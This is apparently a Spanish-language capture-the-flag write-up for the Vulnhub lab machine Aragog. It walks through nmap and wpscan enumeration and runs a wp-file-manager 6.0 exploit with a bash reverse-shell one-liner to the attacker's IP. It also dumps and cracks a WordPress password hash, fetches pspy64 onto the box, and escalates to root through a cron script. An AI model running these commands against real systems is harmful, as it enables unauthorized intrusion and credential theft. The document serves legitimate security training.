+++
title = "aragog - Vulnhub (easy)"
+++


## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/writeups/vulnhub/aragog/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.12**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.12 -oN target_scan.nmap
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 12:38 EDT
Initiating ARP Ping Scan at 12:38
Scanning 10.38.1.12 [1 port]
Completed ARP Ping Scan at 12:38, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:38
Scanning 10.38.1.12 [65535 ports]
Discovered open port 22/tcp on 10.38.1.12
Discovered open port 80/tcp on 10.38.1.12
Completed SYN Stealth Scan at 12:38, 1.20s elapsed (65535 total ports)
Nmap scan report for 10.38.1.12
Host is up, received arp-response (0.000088s latency).
Scanned at 2024-03-29 12:38:57 EDT for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:D5:C7:2A (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

### **Puertos Abiertos: 22,80**

## Ejecución de scripts con nmap

```bash
sudo nmap -sCV -p22,80 10.38.1.12 -oN scripts_exec.nmap
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 12:46 EDT
Nmap scan report for 10.38.1.12
Host is up (0.00068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:D5:C7:2A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.67 seconds
```

## Dominio y subdominio agregado a /etc/hosts 

```bash
10.38.1.12 aragog.vhb
10.38.1.12 wordpress.aragog.hogwarts
```

## Enumeración de directorios con gobuster

```bash
gobuster dir -u http://wordpress.aragog.hogwarts/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.text
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://wordpress.aragog.hogwarts/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 337] [--> http://wordpress.aragog.hogwarts/blog/]
/javascript           (Status: 301) [Size: 343] [--> http://wordpress.aragog.hogwarts/javascript/]
/server-status        (Status: 403) [Size: 290]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

## Enumeración de plugins con wpscan

```bash
wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
```

```bash

         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordpress.aragog.hogwarts/blog/ [10.38.1.12]
[+] Started: Fri Mar 29 13:16:47 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordpress.aragog.hogwarts/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordpress.aragog.hogwarts/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordpress.aragog.hogwarts/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/?feed=rss2, <generator>https://wordpress.org/?v=5.0.12</generator>
 |  - http://wordpress.aragog.hogwarts/blog/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0.12</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/
 | Last Updated: 2023-11-07T00:00:00.000Z
 | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:11 <====================================> (104994 / 104994) 100.00% Time: 00:02:11
[+] Checking Plugin Versions (via Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/
 | Latest Version: 5.3.2
 | Last Updated: 2024-03-21T00:55:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] wp-file-manager
 | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/
 | Last Updated: 2024-03-15T05:29:00.000Z
 | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt
 | [!] The version is out of date, the latest version is 7.2.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/, status: 200
 |
 | Version: 6.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Mar 29 13:19:13 2024
[+] Requests Done: 105004
[+] Cached Requests: 38
[+] Data Sent: 31.394 MB
[+] Data Received: 14.067 MB
[+] Memory used: 442.559 MB
[+] Elapsed time: 00:02:26
```

## Ejecución de exploit encontrado con searchsploit 
*wp-file-manager 6.0*

![searchsploit wp-file-manager](/images/writeups/vulnhub/aragog/searchsploit.png) 

```bash
python3 wp_file_manager_exploit.py http://aragog.vhb/blog  "/bin/bash -c 'bash -i >/dev/tcp/10.38.1.10/4444 0>&1'"
```

## Buscando servicios que corren en la máquina objetivo se encuentra mysql

![servicio mysql](/images/writeups/vulnhub/aragog/mysqlrunning.png) 

## Credenciales para conectarse a mysql encontradas en /etc/wordpress

![Credenciales mysql](/images/writeups/vulnhub/aragog/credentials.png) 

## Credenciales encontradas para usuario hagrid98 en una base de datos

```bash
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
```

## Cracking de contraseña encontrada con john 

![cracking john](/images/writeups/vulnhub/aragog/passhagrid.png) 


## Flag del usuario hagrid98

```bash
hagrid98@Aragog:~$ ls
horcrux1.txt
hagrid98@Aragog:~$ cat horcrux1.txt 
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
```
## Transferencia de pspy64 a máquina objetivo

### Activo un servidor http con python desde mi máquina para hacer un wget y copiar el binario ejecutable pspy64 a la máquina objetivo
```bash
hagrid98@Aragog:/tmp$ wget http://10.38.1.10:8080/pspy64
--2024-03-30 00:46:45--  http://10.38.1.10:8080/pspy64
Connecting to 10.38.1.10:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                         100%[==================================================>]   2.96M  --.-KB/s    in 0.03s   

2024-03-30 00:46:45 (117 MB/s) - ‘pspy64’ saved [3104768/3104768]
hagrid98@Aragog:/tmp$ chmod +x pspy64
hagrid98@Aragog:/tmp$ ls
pspy64
hagrid98@Aragog:/tmp$ ./pspy64
```
## Monitoreo de cronjobs con pspy
```bash
2024/03/30 00:50:01 CMD: UID=0     PID=2367   | /bin/sh -c bash -c "/opt/.backup.sh" 
2024/03/30 00:50:01 CMD: UID=0     PID=2368   | /bin/bash /opt/.backup.sh
```

## Modificación de archivo /opt/.backup.sh

![Modificación de script](/images/writeups/vulnhub/aragog/backuprevshell.png) 


## Flag del usuario root

```bash
root@Aragog:/# cd root
root@Aragog:~# ls
horcrux2.txt
root@Aragog:~# cat horcrux2.txt
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
```

> lYou have successfully pwned Aragog machine.
> Here is your second hocrux: horcrux_
>{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}